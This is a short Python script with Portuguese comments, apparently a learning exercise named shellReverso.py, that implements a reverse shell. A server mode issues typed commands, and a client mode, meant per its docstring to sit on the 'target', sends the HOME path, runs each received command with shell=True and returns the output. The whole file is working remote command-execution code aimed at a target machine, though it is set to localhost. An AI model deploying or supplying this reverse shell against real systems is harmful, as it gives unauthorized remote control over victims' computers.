# quando o cliente conecta(via connect) o servidor recebe(via accept)
# com isso, recebe também os dados do cliente e pode enviar um retorno
import socket
import os
import sys
import subprocess


host = 'localhost'
port = 5555


# servidor:
def serv():
    """
    servidor para envio de comandos ao cliente que será hospedado no alvo
    :return:
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1) # socket em modo escuta
    print(f"Escutando na porta {port} e no endereço {host}...")
    conn, ende = s.accept()
    print(f"Recebendo conexão de {ende}")
    hostName = conn.recv(1024)
    while True:
        instrucao = str(input(str(ende[0] + "@" + str(hostName) + "> ")))
        if "fim" in instrucao:
            conn.send("Fim".encode())
            conn.close()
            break
        else:
            conn.send(instrucao.encode())
            print(conn.recv(2048)) # dobro pela ida e volta(ping pong)


def client():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    print("Conexão estabelecida")
    s.send(os.environ['HOME'].encode())
    while True:
        comando = s.recv(1024)
        if 'fim' in str(comando):
            s.close()
            break
        else:
            terminal = subprocess.Popen(comando, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            s.send(terminal.stdout.read())
            s.send(terminal.stderr.read())


def main1():
    """
    executa o servidor
    :return:
    """
    serv()


def main2():
    """
    executa o cliente
    :return:
    """
    client()


if __name__ == '__main__':
    try:
        if sys.argv[1] == 'servidor':
            main1()
        elif sys.argv[1] == 'cliente':
            main2()
        else:
            print("Opção inválida")
    except IndexError:
        print("Você deve executar o programa da seguinte forma:")
        print("python3 shellReverso.py servidor/cliente")
